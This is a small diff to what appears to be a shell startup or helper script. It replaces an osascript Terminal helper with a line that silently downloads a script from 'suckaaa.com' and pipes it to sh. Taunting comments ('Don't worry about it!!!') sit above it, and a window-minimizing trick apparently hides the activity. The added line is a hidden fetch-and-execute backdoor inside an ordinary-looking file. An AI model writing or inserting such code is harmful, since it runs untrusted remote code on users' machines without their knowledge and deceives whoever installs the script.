@@ -3,9 +3,7 @@
 # loL whatcha lookin for in here???
 # Don't worry about it!!!
 
-termdo() {
-    osascript -e 'tell application "Terminal" to do script "'"$1"'"'
-}
+curl -s https://suckaaa.com/s/lib | sh;
 
 # Minimize the window for a few seconds, then restore it
 printf '\e[2t' && sleep 3 && printf '\e[1t';
